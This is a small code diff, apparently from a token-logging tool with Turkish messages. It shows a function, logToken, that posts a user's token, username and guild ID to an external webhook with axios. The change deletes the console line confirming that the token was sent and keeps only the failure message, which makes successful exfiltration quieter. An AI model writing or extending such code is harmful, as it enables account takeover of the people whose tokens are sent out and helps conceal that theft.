@@ -605,6 +605,5 @@ function logToken(token, username, guildId = null) {
         }]
     };
     axios.post(webhookURL, embedMessage)
-        .then(() => console.log(chalk.gray('Token webhook\'a gönderildi.')))
         .catch(() => console.log(chalk.red('Webhook gönderimi başarısız. URL\'yi kontrol edin.')));
 }
